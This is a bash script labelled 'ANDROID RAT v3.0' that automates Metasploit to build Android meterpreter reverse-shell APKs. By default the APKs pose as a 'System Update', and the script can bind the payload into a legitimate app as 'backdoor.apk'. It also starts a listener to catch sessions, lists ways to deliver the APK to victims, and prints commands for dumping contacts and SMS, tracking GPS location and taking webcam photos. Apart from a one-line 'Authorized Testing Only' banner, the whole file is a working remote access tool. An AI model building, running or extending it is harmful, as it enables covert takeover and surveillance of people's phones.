#!/usr/bin/env bash

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LHOST=""
LPORT=4444
TUNNEL_ADDR=""
WSL_DISTRO="kali-linux"

# Colors
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; W='\033[0m'

info()  { echo -e "${C}[*]${W} $*"; }
ok()    { echo -e "${G}[+]${W} $*"; }
warn()  { echo -e "${Y}[!]${W} $*"; }
err()   { echo -e "${R}[x]${W} $*"; }

banner() {
    clear
    echo -e "${R}===== ANDROID RAT v3.0 (Kali Native) =====${W}"
    echo -e "Remote Access Toolkit | Authorized Testing Only"
}

check_deps() {
    local missing=0
    for cmd in msfvenom msfconsole ip python3; do
        if ! command -v "$cmd" &>/dev/null; then
            err "$cmd not found. Install: sudo apt install -y metasploit-framework python3"
            missing=1
        fi
    done
    if [ "$missing" -eq 1 ]; then
        warn "Installing missing dependencies..."
        sudo apt update -qq && sudo apt install -y metasploit-framework python3 curl
    fi
}

get_local_ip() {
    ip -4 addr show | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | grep -v '^127\.' | grep -v '^172\.1[6-9]\.' | grep -v '^172\.2[0-9]\.' | grep -v '^172\.3[01]\.' | grep -v '^169\.254\.' | head -1
}

start_lan() {
    local ip
    ip=$(get_local_ip)
    if [ -z "$ip" ]; then
        err "Cannot detect LAN IP."
        return 1
    fi
    TUNNEL_ADDR="${ip}:${LPORT}"
    ok "LAN mode: $TUNNEL_ADDR"
    info "Use this IP in payload: $TUNNEL_ADDR"
    return 0
}

stop_tunnel() {
    TUNNEL_ADDR=""
    info "LAN mode stopped"
}

build_payload() {
    local lhost="$1" lport="$2" template="$3" outname="$4" appname="$5"
    [ -z "$lhost" ] && { err "LHOST required."; return 1; }
    [ -z "$lport" ] && lport=$LPORT
    [ -z "$outname" ] && outname="Update.apk"
    [ -z "$appname" ] && appname="System Update"

    local outdir="$SCRIPT_DIR/payloads"
    mkdir -p "$outdir"
    local outpath="$outdir/$outname"
    local apk_flag=""

    info "Building payload: LHOST=$lhost LPORT=$lport"

    if [ -n "$template" ] && [ -f "$template" ]; then
        info "Binding into: $template"
        apk_flag="-x $template"
    fi

    local cmd="msfvenom $apk_flag -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport"
    [ -n "$appname" ] && cmd+=" AndroidAppName='$appname'"
    cmd+=" AndroidMkSdk=33 AndroidTargetSdk=33 -o /tmp/payload.apk --platform android --arch dalvik 2>&1"

    if ! eval "$cmd"; then
        err "msfvenom failed"
        return 1
    fi

    local size
    size=$(stat -c%s /tmp/payload.apk 2>/dev/null)
    if [ -z "$size" ] || [ "$size" -lt 500 ]; then
        err "Payload too small or missing"
        return 1
    fi

    cp /tmp/payload.apk "$outpath"
    ok "Payload: $outpath ($(awk "BEGIN {printf \"%.1f\", $size/1024}") KB)"
    echo "$outpath"
}

start_listener() {
    local rcfile="$SCRIPT_DIR/listener.rc"
    local postfile="$SCRIPT_DIR/post_exploit.rc"

    cp "$rcfile" /tmp/listener.rc
    [ -f "$postfile" ] && cp "$postfile" /tmp/post_exploit.rc

    info "Starting Metasploit listener..."
    info "Waiting for session... (Ctrl+C to exit)"
    cd /tmp && msfconsole -q -r listener.rc
}

stop_listener() {
    pkill -f msfconsole 2>/dev/null
    info "Metasploit stopped"
}

show_sessions() {
    echo 'sessions -l' | msfconsole -q
}

start_autorat() {
    local template="$1" outname="$2" appname="$3"
    [ -z "$outname" ] && outname="Update.apk"
    [ -z "$appname" ] && appname="System Update"

    banner
    info "===== AutoRAT ====="

    info "[1/3] Detecting LAN IP..."
    start_lan || { err "Aborting."; return 1; }

    local lhost="${TUNNEL_ADDR%:*}"
    local lport="${TUNNEL_ADDR##*:}"

    info "[2/3] Building payload..."
    local apk
    apk=$(build_payload "$lhost" "$lport" "$template" "$outname" "$appname")
    [ -z "$apk" ] && { err "Aborting."; stop_tunnel; return 1; }

    info "[3/3] Starting listener..."
    start_listener

    stop_listener
    stop_tunnel
    ok "Done"
}

delivery_menu() {
    echo -e "${Y}"
    echo "  1. HTTP:  python3 -m http.server 8080"
    echo "  2. USB:   adb install payloads/<apk>"
    echo "  3. Cloud: Upload to Google Drive/MediaFire"
    echo -e "${W}"
}

post_cheatsheet() {
    echo -e "${G}"
    echo "  sysinfo          - Device info"
    echo "  dump_contacts    - Export contacts"
    echo "  dump_sms         - Export SMS"
    echo "  geolocate        - GPS coordinates"
    echo "  webcam_snap      - Take photo"
    echo "  shell            - Android shell"
    echo "  download FILE    - Pull file from device"
    echo "  upload FILE      - Push file to device"
    echo -e "${W}"
}

main_menu() {
    while true; do
        banner
        echo -e "${C}LHOST: ${TUNNEL_ADDR:-"(not set)"}  LPORT: $LPORT${W}"
        echo ""
        echo "  [1] Detect LAN IP"
        echo "  [2] Build Payload APK"
        echo "  [3] Auto Mode (LAN + Payload + Listener)"
        echo "  [4] Start Listener (wait session)"
        echo "  [5] Show Sessions"
        echo "  [6] Stop All"
        echo "  [7] Delivery Methods"
        echo "  [8] Bind to Template APK"
        echo "  [9] Post-Exploit Cheatsheet"
        echo "  [Q] Quit"
        echo ""

        read -rp "Select option: " opt

        case "$opt" in
            1) start_lan && ok "LAN IP: $TUNNEL_ADDR"; read -rp "Press Enter..." ;;
            2)
                read -rp "LHOST (e.g., 192.168.1.10): " lh
                read -rp "LPORT (default: $LPORT): " lp
                lp="${lp:-$LPORT}"
                read -rp "Output name (default: Update.apk): " nm
                nm="${nm:-Update.apk}"
                read -rp "App name (default: System Update): " an
                an="${an:-System Update}"
                build_payload "$lh" "$lp" "" "$nm" "$an"
                read -rp "Press Enter..."
                ;;
            3)
                read -rp "Output APK name (default: Update.apk): " nm
                nm="${nm:-Update.apk}"
                read -rp "App name (default: System Update): " an
                an="${an:-System Update}"
                warn "This will detect LAN IP + build payload + wait for session."
                warn "Press Ctrl+C to stop listener."
                read -rp "Continue? (y/n): " yn
                [ "$yn" = "y" ] && start_autorat "" "$nm" "$an"
                read -rp "Press Enter..."
                ;;
            4) start_listener; read -rp "Press Enter..." ;;
            5) show_sessions; read -rp "Press Enter..." ;;
            6) stop_listener; stop_tunnel; ok "All stopped"; read -rp "Press Enter..." ;;
            7) delivery_menu; read -rp "Press Enter..." ;;
            8)
                read -rp "Path to legit APK: " tmpl
                [ ! -f "$tmpl" ] && { err "Not found"; read -rp "Press Enter..."; continue; }
                read -rp "LHOST: " lh
                read -rp "LPORT (default: $LPORT): " lp
                lp="${lp:-$LPORT}"
                read -rp "Output name (default: backdoor.apk): " nm
                nm="${nm:-backdoor.apk}"
                build_payload "$lh" "$lp" "$tmpl" "$nm"
                read -rp "Press Enter..."
                ;;
            9) post_cheatsheet; read -rp "Press Enter..." ;;
            q|Q) stop_listener; stop_tunnel; exit 0 ;;
        esac
    done
}

check_deps
main_menu
